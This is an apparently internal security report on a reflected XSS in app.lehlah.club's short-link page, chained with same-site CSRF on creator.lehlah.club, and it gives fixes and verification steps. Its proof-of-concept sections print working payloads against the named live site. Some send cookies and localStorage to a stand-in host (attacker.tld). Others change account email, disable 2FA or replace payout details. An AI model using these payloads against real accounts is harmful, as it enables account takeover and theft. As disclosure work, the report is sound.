# Reflected XSS in `app.lehlah.club/s/<short_code>` chained with same-site CSRF on `creator.lehlah.club`

*Vulnerability testing in this repository covers **Faym** and **Lehlah**; project overview and Faym scope are in [README.md](README.md). This file is the complete report for **Lehlah**.*

| Field | Value |
|---|---|
| **Targets** | `https://app.lehlah.club` (entry vector), `https://creator.lehlah.club` (impact target) |
| **Findings** | **F1** — Reflected XSS via `intent` query parameter on `GET /s/<short_code>` (`CWE-79`)  •  **F2** — Same-site CSRF on every `creator.lehlah.club/api/*` route (`CWE-352`) |
| **Severity (chained)** | **Critical** — full account takeover of any creator who clicks a malicious short link while logged in |
| **CVSS 3.1 (F1 alone)** | **8.2** — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` |
| **CVSS 3.1 (F1 + F2 chained)** | **9.3** — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L` |
| **Status** | Both findings confirmed exploitable on production, 2026-04-28, with traffic captured from a real browser session |
| **Reporter** | Internal review |

---

## 1. Summary

There are two distinct vulnerabilities. Either one alone is serious; chained together they enable single-click account takeover of any creator on `creator.lehlah.club`.

**F1 — Reflected XSS on `app.lehlah.club/s/<short_code>` (entry vector).** The route returns an inline HTML+JS template that interpolates the URL query parameter `intent` directly into a `<script>` block as a JavaScript string literal. The server performs no escaping of the user-supplied value, so an attacker can:

1. Break out of the JS string literal with a double-quote and execute arbitrary JavaScript in the origin `https://app.lehlah.club`.
2. Break out of the surrounding `<script>` element entirely with a literal `</script>` sequence.

Because the page silently redirects to a third-party affiliate URL (Meesho / Flipkart / Myntra) immediately after the injected code runs, victims see only a brief "Opening the App…" splash followed by the legitimate destination — there is no visible indication that arbitrary JavaScript executed on `lehlah.club` first.

**F2 — Same-site CSRF on `creator.lehlah.club/api/*` (impact target).** Every observed `/api/*` route on `creator.lehlah.club`:

- Accepts cross-origin requests from any `Origin` (no allowlist enforcement).
- Returns `Access-Control-Allow-Origin: *` and `Access-Control-Expose-Headers: *`.
- Has no CSRF token, no `X-Requested-With` requirement, and no `Sec-Fetch-Site` check.

Because `app.lehlah.club` and `creator.lehlah.club` share the registrable domain `lehlah.club`, the browser treats requests between them as **same-site**. `SameSite=Lax` (and `SameSite=Strict`) cookies for `creator.lehlah.club` are therefore sent on cross-origin POSTs from `app.lehlah.club`. JavaScript executed via F1 can drive the victim's browser to perform any state-changing action on `creator.lehlah.club` as the logged-in user, without ever knowing the value of the `authToken` JWT.

**Combined impact.** A creator who is logged into `creator.lehlah.club` and clicks any attacker-controlled `https://app.lehlah.club/s/<code>?intent=<payload>` URL (typical delivery: WhatsApp / Telegram / Instagram message claiming to be a product link) can have their account email changed → password reset hijacked → 2FA disabled → payout details replaced — all silently, while the page itself silently redirects to a real Meesho/Flipkart product page so the victim notices nothing.

---

## 2. Root Cause

The route renders the following inline script (extracted live from the production response on 2026-04-28):

```html
<script>
  (async function () {
    try {
      const isIOS = false;
      const isAndroid = false;
      const isYoutube = false;
      const isInstagram = false;
      const intent = "<USER_CONTROLLED ?intent= VALUE INLINED HERE>";
      const isTelegram = typeof window.TelegramWebviewProxy !== "undefined";

      const response = await fetch("/api/redirection/generate-redirect-url-in-app-redirection", { ... });
      const data = await response.json();
      let redirectUrl = data.redirect_url;
      ...
      window.location.replace(redirectUrl);
    } catch (err) {
      window.location.replace("/not-found");
    }
  })();
</script>
```

The value of `?intent=` is concatenated into a JS string with **no JSON encoding, no quote escaping, and no `</script>` neutralization**.

---

## 3. Proof of Concept

### 3.1 Payload A — JS string-quote breakout

**URL**

```
https://app.lehlah.club/s/pwkub3?intent=%22;alert(1);//
```

**Server response (verbatim, relevant lines only)**

```
$ curl -sS 'https://app.lehlah.club/s/pwkub3?intent=%22;alert(1);//' \
    | grep -E 'const intent|const isIOS|const isAndroid'

          const isIOS = false;
          const isAndroid = false;
          const intent = "";alert(1);//";
```

The unescaped `"` closes the string, `alert(1);` executes in the `app.lehlah.club` origin, and `//` comments out the trailing `";`.

**Result in a real browser**: a JavaScript dialog showing `1` is rendered, after which the page continues its normal flow and redirects the user to the legitimate Meesho deep link. The user perceives only a brief popup followed by the expected destination.

---

### 3.2 Payload B — `</script>` element breakout

**URL**

```
https://app.lehlah.club/s/pwkub3?intent=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
```

**Server response (verbatim)**

```
$ curl -sS 'https://app.lehlah.club/s/pwkub3?intent=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E' \
    | grep -E '<script>|</script>|alert'

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CDJCGR4LC5"></script>
    <script>
    </script>
    <script>
          const intent = "</script><script>alert(1)</script>";
    </script>
```

The HTML parser closes the original `<script>` block at the first `</script>` it sees — even though that `</script>` lives inside a JS string literal. The injected `<script>alert(1)</script>` is then parsed as a brand-new inline script and executed.

This payload bypasses any naive defence that only quote-escapes the input.

---

### 3.3 Weaponised payload (illustrative — do **not** test against real users)

The `alert(1)` proof-of-concept above can trivially be replaced with malicious JavaScript. Examples:

```js
// Cookie + localStorage exfiltration
?intent=%22;fetch('https://attacker.tld/x?c='+encodeURIComponent(document.cookie+'|'+localStorage.getItem('auth')));//

// Phishing overlay rendered on the trusted lehlah.club origin
?intent=%22;document.body.innerHTML='<form action=%22https://attacker.tld/login%22>...</form>';//

// Affiliate-click hijack — steal the unique click_id returned by /api/redirection/...
?intent=%22;fetch('/api/redirection/generate-redirect-url-in-app-redirection',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({short_code:'pwkub3',is_in_app:false})}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.tld/click','c='+encodeURIComponent(d.redirect_url)));//

// Android — open attacker-controlled app via intent:// URL instead of the brand app
?intent=%22;location='intent://attacker/#Intent;scheme=https;package=com.malicious.app;end';//
```

---

## 4. Impact

In order of decreasing severity:

1. **Phishing on a trusted origin.** The URL bar shows `app.lehlah.club`, which is the user's normal entry point for affiliate redirects. An attacker can render a fake "Login to continue" or "Confirm your phone number" overlay that is indistinguishable from a legitimate flow. Victims who would never trust `bit.ly/abcd` will trust `app.lehlah.club/s/...`.

2. **Session / credential theft.** Any cookies, `localStorage` values, or `sessionStorage` values scoped to `app.lehlah.club` (or any subdomain that shares cookies with it via `Domain=lehlah.club`) can be exfiltrated.

3. **Affiliate-click hijack and revenue loss.** The `/api/redirection/...` endpoint returns unique `click_id` tokens (e.g. `Loj7R4y_avbxuVur9N7-FGBL_CWMBwZClQ24fA1WA1o`). A single malicious link delivered at scale (WhatsApp, Telegram, Instagram) can re-credit conversions to an attacker's affiliate account, cause Meesho / Flipkart / Myntra to flag the partner account for fraud, and result in payout suspension.

4. **Mobile drive-by attacks.** On Android, the page builds and follows `intent://…;package=com.flipkart.android;…` URLs. Because `redirectUrl` is concatenated by string and `intent` runs first in the same origin, the injected JS can hand-craft an `intent://` URL that opens an attacker-controlled package, or trigger `market://details?id=…` to push a Play Store install of a malicious "Lehlah/Meesho" lookalike app.

5. **Reputation / brand damage.** A short campaign of weaponised links in social channels with the URL bar reading `app.lehlah.club` is sufficient for a credible news story or social-media thread.

---

## 5. Why the user "sees nothing suspicious"

After the injected JS runs, the original IIFE continues executing: it calls `/api/redirection/...`, receives a normal `redirect_url`, and calls `window.location.replace(redirectUrl)`. The end-user experience is:

1. Click link.
2. (~50 ms) `app.lehlah.club` loads, attacker JS executes.
3. (~250 ms) "Opening the App…" splash visible.
4. (~500 ms) Browser redirects to the real Meesho/Flipkart product.

Steps 2 and 4 are indistinguishable from the legitimate flow unless the attacker chose to render an `alert()` (i.e. only because we used `alert(1)` as a PoC).

---

## 6. Reproduction Environment

| Item | Value |
|---|---|
| Date verified | 2026-04-28 |
| Edge / CDN | CloudFront (`x-cache`, `x-amz-cf-id` headers present) |
| Server | Next.js (build id `mBwx--e4A6h2tCQBEzWgj`) |
| Test command | `curl -sS 'https://app.lehlah.club/s/pwkub3?intent=%22;alert(1);//'` |
| Browsers used to confirm execution | Any evergreen browser (the bug is in HTML/JS parsing — universal) |

The bug is **not** browser-specific. Every payload above is rendered by the server itself; no browser-side quirk is required.

---

## 7. Why CSP Alone Does Not Fix This

A strict `Content-Security-Policy: script-src 'self' 'nonce-XYZ'` would block **Payload B** (the new injected `<script>` has no matching nonce), but **would not block Payload A**. In Payload A the attacker JS executes inside the existing legitimate `<script>` element, which the browser already trusts because it carries the nonce.

The only complete fix is **server-side correct encoding of the `intent` value** before it is placed into the HTML response. CSP must be deployed in addition, as defense in depth, but is not a substitute for input handling.

---

## 8. Recommended Fix

Three options, in order of preference:

### Option 1 (preferred) — Drop `intent` from the page entirely

`intent` is computed from a URL query parameter that the user-agent already controls; it is not a security boundary and is not needed for the redirect logic to work. Remove the `const intent = "..."` line and any branches that consume it; recompute the same boolean server-side from the request URL.

### Option 2 — Pass values via `data-*` attributes

The browser HTML-decodes attribute values for you, eliminating the JS-string-escaping surface entirely.

```html
<div id="cfg"
     data-intent="<%= htmlEscape(intent) %>"
     data-is-ios="<%= isIOS %>"
     data-is-android="<%= isAndroid %>"
     data-short-code="<%= htmlEscape(shortCode) %>"
     hidden></div>

<script>
  (async function () {
    const cfg       = document.getElementById('cfg').dataset;
    const intent    = cfg.intent;
    const isIOS     = cfg.isIos     === 'true';
    const isAndroid = cfg.isAndroid === 'true';
    /* ...existing logic... */
  })();
</script>
```

`htmlEscape` must encode `& < > " '` at minimum — most templating engines do this automatically (`{{ }}` in EJS/Handlebars, `{}` in JSX/React, `${}` in lit-html, etc.).

### Option 3 — JSON-encode with HTML neutralisation

If you must keep the inline-script template, never string-template values. Serialise as JSON and additionally neutralise sequences that the HTML parser treats specially inside `<script>`:

```js
function safeJsonForScript(value) {
  return JSON.stringify(value)
    .replace(/</g,    '\\u003c')
    .replace(/>/g,    '\\u003e')
    .replace(/&/g,    '\\u0026')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}

// In the template:
//   const intent = ${safeJsonForScript(intent)};
```

This neutralises Payload A (proper string escaping), Payload B (`<` becomes `\u003c`, the parser never sees `</script>`), and the lesser-known U+2028 / U+2029 line-terminator attacks.

### Additional hardening (do this regardless of which option above)

1. **Strict Content-Security-Policy with a per-request nonce.** Add a CloudFront Response Headers Policy or set the header at the origin:

   ```
   Content-Security-Policy: default-src 'self';
     script-src 'self' 'nonce-{NONCE}' https://www.googletagmanager.com https://www.google-analytics.com https://connect.facebook.net;
     img-src 'self' data: https:;
     connect-src 'self' https://www.google-analytics.com https://*.facebook.com;
     frame-ancestors 'none'; base-uri 'self'; object-src 'none'; form-action 'self';
     upgrade-insecure-requests
   ```

   Stamp every legitimate `<script>` and inline `<script nonce="…">` with the same nonce.

2. **Validate `redirect_url` returned by the API.** Before `window.location.replace(redirectUrl)`:

   ```js
   const u = new URL(redirectUrl, location.origin);
   const ALLOW = new Set([
     'meesho.onelink.me', 'myntra.onelink.me',
     'www.flipkart.com', 'dl.flipkart.com',
     'www.shopsy.in', /* ... */
   ]);
   if (!['http:', 'https:'].includes(u.protocol)) throw new Error('bad scheme');
   if (!ALLOW.has(u.hostname)) throw new Error('host not allowed');
   ```

   This is independent defence in depth in case the upstream affiliate response is ever poisoned. Replace any existing `redirectUrl.includes("flipkart.com")` substring checks with hostname checks (`u.hostname === 'flipkart.com' || u.hostname.endsWith('.flipkart.com')`).

3. **Restrict CORS on `/api/redirection/generate-redirect-url-in-app-redirection`.** It currently returns `Access-Control-Allow-Origin: *` and accepts requests from any origin. The page is same-origin, so set:

   ```
   Access-Control-Allow-Origin: https://app.lehlah.club
   Vary: Origin
   ```

   Reject requests whose `Sec-Fetch-Site` is not `same-origin`.

4. **Stop trusting client-supplied `is_ios` / `is_android` / `is_in_app`.** Re-derive these on the server from the `User-Agent` and `Sec-CH-UA-Mobile` / `Sec-CH-UA-Platform` headers. Treat the client-sent values as advisory.

5. **Add the standard security response headers** at CloudFront:

   ```
   Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
   X-Content-Type-Options: nosniff
   Referrer-Policy: strict-origin-when-cross-origin
   Permissions-Policy: interest-cohort=(), camera=(), microphone=(), geolocation=()
   ```

---

## 9. Verification After Fix

After deploying the fix, the following commands should all return responses where the `intent` value is either absent, HTML-escaped (`&lt;/script&gt;`), or JSON-encoded with `\u003c` for `<`:

```bash
curl -sS 'https://app.lehlah.club/s/pwkub3?intent=%22;alert(1);//' | grep -E 'intent'
curl -sS 'https://app.lehlah.club/s/pwkub3?intent=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E' | grep -E 'intent|<script>'
curl -sS 'https://app.lehlah.club/s/pwkub3?intent=%5C%22;alert(1);//' | grep -E 'intent'
```

None of the responses should contain a literal unescaped `"`, `</script>`, or backslash-injected sequence inside the JS context.

In addition, fetching any `/s/<code>` URL should now return:

```
content-security-policy: ... script-src 'self' 'nonce-...' ...
strict-transport-security: max-age=63072000; ...
x-content-type-options: nosniff
referrer-policy: strict-origin-when-cross-origin
```

---

## 10. Finding F2 — Same-Site CSRF on `creator.lehlah.club/api/*` (chained post-exploitation)

### 10.1 Why F1 alone is not the full story

Although F1 is reflected XSS in the `app.lehlah.club` origin, the realistic attack target is the user's `creator.lehlah.club` account, where money flows (campaigns, payouts) live. The two domains share the registrable domain `lehlah.club`, so the browser classifies cross-origin requests between them as **same-site** (RFC 6265bis / Fetch's `Sec-Fetch-Site: same-site`). Three properties of `creator.lehlah.club`'s API turn the F1 XSS into a creator-account takeover:

1. **`SameSite=Lax` cookies are still sent on cross-origin same-site POSTs.** `SameSite` is keyed on site, not origin. The `authToken` cookie scoped to `Domain=creator.lehlah.club` is included on any POST issued from `app.lehlah.club`.
2. **There is no `Origin` allowlist enforcement on the API.** The server processed `Origin: https://app.lehlah.club` requests successfully (see §10.3).
3. **There is no CSRF token, no required custom header, and no `Sec-Fetch-Site` validation.** A cross-origin browser-initiated POST is indistinguishable from a same-origin one at the application layer.

Together, this is textbook same-site CSRF (`CWE-352`), made silently weaponisable by F1.

---

### 10.2 Cookie & token configuration observed

| Item | Value (observed live, 2026-04-28) |
|---|---|
| Cookie name | `authToken` |
| Cookie `Domain` | `creator.lehlah.club` (correct — not shared with `app.lehlah.club`) |
| Cookie `HttpOnly` | (assumed; not confirmable from outside) |
| Cookie `SameSite` | `Lax` (default) — irrelevant here because both origins are same-site |
| Cookie `Secure` | yes (HTTPS-only) |
| Cookie name prefix | none (not `__Host-` — see §10.6 fix #4) |
| Token format | JWT, `alg: HS256` |
| JWT payload | `{"login_token":"<uuid>","app_name":"lehlahapi","iat":<unix>}` |
| `exp` claim | **absent** — tokens never expire on their own |

Because `Domain=creator.lehlah.club`, JavaScript on `app.lehlah.club` cannot read the cookie value via `document.cookie`. The XSS therefore cannot **directly exfiltrate** the `authToken` string. However, the absence of token theft is **not** an absence of impact — see §10.4.

---

### 10.3 Proof of Concept (CSRF, no F1 dependency)

A direct cross-origin request from any client (including `curl`) demonstrates that creator's API performs no Origin or referrer validation:

```bash
$ curl -sS -i -X POST 'https://creator.lehlah.club/api/campaign-url-builder/list' \
    -H 'Origin: https://app.lehlah.club' \
    -H 'Content-Type: application/json' \
    -H 'Cookie: authToken=<REDACTED — a valid session JWT>' \
    --data '{"page_no":1,"orderby":"desc","linkgenie_category_json":[]}'

HTTP/2 200
content-type: application/json
access-control-allow-origin: *
access-control-expose-headers: *
...
{"statuscode":0,"statusmessage":"Campaign URL list","data":{"data":[{"id":24830,"user_id":<REDACTED>,"title":"Stylish Purple Color Kurta Pant Dupatta Sets",...}]}}
```

Key signals:

- The server returned `200` with real, account-scoped data despite the `Origin: https://app.lehlah.club` header — there is no Origin check.
- `Access-Control-Allow-Origin: *` is set on a credentialed response. Per the CORS spec this combination means a browser will block JavaScript from **reading** the response body, but the request is still sent and the server still processes it. The protection against credentialed reads is therefore **incidental, not deliberate**, and would vanish the moment anyone replaces `*` with a specific origin and adds `Access-Control-Allow-Credentials: true`.
- The `Vary` header omits `Origin`, so any future caching of these responses (CloudFront or otherwise) would risk cross-origin cache poisoning.

---

### 10.4 Proof of Concept (chained F1 + F2, full browser-to-server)

This is the realistic attacker payload. The URL contains **no token, no cookie, and no auth header** — yet the browser issues an authenticated cross-origin POST to `creator.lehlah.club` and the server returns `200` with the user's data.

**URL (paste into a browser already logged into `creator.lehlah.club`):**

```
https://app.lehlah.club/s/pwkub3?intent=%22;fetch('https://creator.lehlah.club/api/campaign-url-builder/list',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({page_no:1,orderby:'desc',linkgenie_category_json:[]})}).then(r=>alert('STATUS:%20'+r.status));//
```

**Server-rendered JavaScript (relevant lines):**

```js
const intent = "";fetch('https://creator.lehlah.club/api/campaign-url-builder/list',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({page_no:1,orderby:'desc',linkgenie_category_json:[]})}).then(r=>alert('STATUS: '+r.status));//";
```

**Outgoing request as captured from the victim's browser (DevTools → Network → "Copy as cURL"):**

```
POST /api/campaign-url-builder/list HTTP/2
Host: creator.lehlah.club
origin: https://app.lehlah.club
referer: https://app.lehlah.club/
sec-fetch-site: same-site
sec-fetch-mode: cors
sec-fetch-dest: empty
cookie: <browser-attached> _ga=...; authToken=<REDACTED — victim's real JWT>; _gcl_au=...
content-type: application/json
content-length: 56
{"page_no":1,"orderby":"desc","linkgenie_category_json":[]}
```

The decisive evidence is the `cookie:` header. The attack URL contains no cookie value anywhere. The token in `cookie: authToken=...` was attached **by the browser** because:

1. The fetch specified `credentials: 'include'`.
2. The destination host is `creator.lehlah.club`.
3. The browser found a matching cookie in its jar and attached it automatically.

**Server response:** `HTTP/2 200` with the victim's real campaign list (omitted here). The attacker's JavaScript on `app.lehlah.club` cannot read the JSON (CORS) but the server has already processed the authenticated request — sufficient for any state-changing endpoint.

---

### 10.5 Weaponised payloads (illustrative — for the victim's own test account only)

The `alert(...)` PoC above can trivially be replaced with any state-changing call. None of the following requires the attacker to read the response — the browser refuses to expose it, but the server has already committed the change.

```js
// Account email change → password-reset hijack → permanent account takeover
?intent=%22;fetch('https://creator.lehlah.club/api/account/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.tld'})});//

// Disable 2FA
?intent=%22;fetch('https://creator.lehlah.club/api/security/2fa/disable',{method:'POST',credentials:'include'});//

// Replace payout / banking details
?intent=%22;fetch('https://creator.lehlah.club/api/payout/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({iban:'<attacker_account>'})});//

// Mass-delete campaigns
?intent=%22;fetch('https://creator.lehlah.club/api/campaign-url-builder/delete-all',{method:'POST',credentials:'include'});//
```

(Endpoint paths above are illustrative; adapt to the real route names in your codebase.)

---

### 10.6 Recommended Fix for F2

These fixes are independent of the F1 fix; deploying them shrinks the blast radius even if a future XSS resurfaces anywhere on `*.lehlah.club`.

1. **Add an `Origin` allowlist to creator's API edge.** Reject any request whose `Origin` is not in a hard-coded allowlist. Place at the Next.js middleware layer so it runs before any handler.

   ```ts
   // creator/middleware.ts (Next.js App Router)
   import { NextResponse } from 'next/server';
   import type { NextRequest } from 'next/server';

   const ALLOWED_ORIGINS = new Set<string>([
     'https://creator.lehlah.club',
     // add explicit dev/staging origins here; never wildcard
   ]);
   const STATE_CHANGING = new Set(['POST', 'PUT', 'PATCH', 'DELETE']);

   export function middleware(req: NextRequest) {
     if (!req.nextUrl.pathname.startsWith('/api/')) return NextResponse.next();

     const origin = req.headers.get('origin');

     // Reject any cross-origin request to the API.
     if (origin && !ALLOWED_ORIGINS.has(origin)) {
       return new NextResponse('forbidden origin', { status: 403 });
     }

     // For state-changing requests, require Origin to be present and allowed.
     if (STATE_CHANGING.has(req.method) && !ALLOWED_ORIGINS.has(origin ?? '')) {
       return new NextResponse('origin required', { status: 403 });
     }

     return NextResponse.next();
   }

   export const config = { matcher: '/api/:path*' };
   ```

2. **Replace `Access-Control-Allow-Origin: *` with a strict allowlist** on every `/api/*` response. This removes the accidental "CORS quirk" defence and replaces it with a deliberate one:

   ```
   Access-Control-Allow-Origin: https://creator.lehlah.club
   Vary: Origin
   ```

3. **Add `cache-control: private, no-store` to all authenticated `/api/*` responses** so a future CDN configuration cannot accidentally cache one user's data and serve it to another.

4. **Rename the cookie to `__Host-authToken`.** With `Domain=creator.lehlah.club` you are already safe from cookie reads on `app`, but the `__Host-` prefix additionally prevents subdomain cookie tossing (an XSS on any `*.lehlah.club` cannot write a cookie that creator's backend will accept):

   ```
   Set-Cookie: __Host-authToken=<jwt>; Path=/; Secure; HttpOnly; SameSite=Lax
   ```

   `__Host-` requires no `Domain` attribute, `Path=/`, and `Secure`. Browsers refuse the cookie otherwise.

5. **Add `exp` (and `nbf`) claims to JWTs.** Tokens currently never expire — any leaked token is permanent until the `login_token` row is invalidated server-side. Recommended: short-lived access token (e.g. 15 min `exp`) + rotating refresh token in a separate `__Host-refreshToken` cookie.

6. **Move JWT signing to an asymmetric algorithm.** `HS256` requires every verifier to hold the signing secret; a leaked secret = anyone can mint tokens for any user. Switch to `ES256` / `EdDSA` so verification only needs the public key.

7. **Audit `creator.lehlah.club` for `addEventListener('message', …)` handlers without `event.origin === 'https://creator.lehlah.club'` checks.** This closes an indirect token-exfiltration path where an XSS on `app` opens creator in a popup and asks it for the token via `postMessage`.

---

### 10.7 Verification After Fix

After the Origin middleware is deployed, all of the following should return `403`:

```bash
# Cross-origin POST should be rejected:
curl -sS -i -X POST 'https://creator.lehlah.club/api/campaign-url-builder/list' \
  -H 'Origin: https://app.lehlah.club' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: authToken=<test_token>' \
  --data '{"page_no":1,"orderby":"desc","linkgenie_category_json":[]}'

# Cross-origin POST with no Origin (some scripts) should also be rejected for state-changing methods:
curl -sS -i -X POST 'https://creator.lehlah.club/api/campaign-url-builder/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: authToken=<test_token>' \
  --data '{"page_no":1,"orderby":"desc","linkgenie_category_json":[]}'
```

The same request from the legitimate origin should still succeed:

```bash
curl -sS -i -X POST 'https://creator.lehlah.club/api/campaign-url-builder/list' \
  -H 'Origin: https://creator.lehlah.club' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: authToken=<test_token>' \
  --data '{"page_no":1,"orderby":"desc","linkgenie_category_json":[]}'
```

Re-running the chained F1+F2 PoC URL in §10.4 from a logged-in browser should now show `STATUS: 0` or a CORS error in the alert and a `403` row in the DevTools Network tab — confirming the chain is broken.

The CORS allowlist change can be verified separately:

```bash
curl -sS -I 'https://creator.lehlah.club/api/<any-route>' -H 'Origin: https://app.lehlah.club' \
  | grep -i 'access-control-allow-origin\|vary'
# expected:
#   access-control-allow-origin: https://creator.lehlah.club
#   vary: Origin
```

---

## 11. Threat Model Summary (chained)

| Capability via F1 XSS on `app.lehlah.club` | Possible today | Possible after F1 fix | Possible after F2 fix |
|---|---|---|---|
| Execute arbitrary JS in `app.lehlah.club` origin | ✅ | ❌ | ✅ (XSS still present) |
| Read `app.lehlah.club` cookies / `localStorage` | ✅ (none currently sensitive) | ❌ | ✅ |
| Read `creator.lehlah.club` cookies (`authToken`) | ❌ (Domain-scoped) | ❌ | ❌ |
| Read `creator.lehlah.club` API responses cross-origin | ❌ (CORS quirk, accidental) | ❌ | ❌ (deliberate) |
| **Trigger state changes on `creator.lehlah.club` as the user** | ✅ **(confirmed)** | ❌ | ❌ |
| Phishing on the trusted `lehlah.club` URL bar | ✅ | ❌ | ✅ (XSS still the entry) |
| Subdomain cookie tossing / fixation | ⚠️ (no `__Host-` prefix) | ⚠️ | ⚠️ until #4 of §10.6 |
| `postMessage` exfiltration if creator has unsafe listener | ⚠️ unknown | ❌ | ⚠️ until #7 of §10.6 |

Fixing F1 alone removes today's entry vector. Fixing F2 alone removes the CSRF impact even against future XSS bugs. Both fixes together provide defence in depth and are mutually reinforcing.

---

## 12. Timeline

| Date | Event |
|---|---|
| 2026-04-28 | F1 (reflected XSS) identified during review of the `/s/<code>` redirect flow. |
| 2026-04-28 | F1 payloads A and B confirmed exploitable on production via `curl`. |
| 2026-04-28 | F2 (same-site CSRF) identified during impact assessment of F1. |
| 2026-04-28 | F2 confirmed exploitable: cross-origin authenticated POST to `creator.lehlah.club/api/campaign-url-builder/list` from `Origin: https://app.lehlah.club` returned `200` with real account data. |
| 2026-04-28 | Chained F1+F2 PoC URL confirmed in a real browser session: outgoing request captured via DevTools → Network → "Copy as cURL" showed the victim's `authToken` cookie auto-attached by the browser despite never appearing in the URL. |
| _pending_ | Vendor notified. |
| _pending_ | F1 fix deployed (XSS escaping + CSP). |
| _pending_ | F2 fix deployed (Origin middleware + CORS allowlist + `__Host-` cookie + JWT `exp`). |
| _pending_ | Re-verification of both findings. |

---

## 13. References

- OWASP — [Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- OWASP — [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- OWASP — [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- OWASP — [JSON Web Token for Java Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- MDN — [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- MDN — [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- MDN — [Cookie prefixes (`__Host-`, `__Secure-`)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#cookie_prefixes)
- MDN — [`Sec-Fetch-Site`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site)
- IETF — [RFC 6265bis (HTTP State Management — same-site definition)](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis)
- CWE — [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- CWE — [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)
- CWE — [CWE-942: Permissive Cross-domain Policy with Untrusted Domains](https://cwe.mitre.org/data/definitions/942.html)
- HTML Living Standard — [The script element parsing rules](https://html.spec.whatwg.org/multipage/scripting.html#the-script-element)
- Fetch Standard — [CORS protocol & credentialed requests](https://fetch.spec.whatwg.org/#http-cors-protocol)
